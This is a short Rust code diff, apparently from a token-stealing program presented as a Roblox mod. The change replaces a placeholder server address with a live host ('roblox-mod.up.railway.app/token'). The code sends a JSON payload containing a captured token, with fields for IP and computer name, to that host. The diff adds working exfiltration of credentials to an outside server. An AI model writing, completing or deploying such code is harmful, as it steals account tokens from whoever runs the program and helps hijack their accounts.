@@ -22,7 +22,7 @@ fn main() {
             r#"{{"token":"{}","ip":"","computer":""}}"#,
             token
         );
-        send_to_server("https://YOUR_RAILWAY_URL/token", &payload);
+        send_to_server("roblox-mod.up.railway.app/token", &payload);
     }
 
     let dirs = vec![
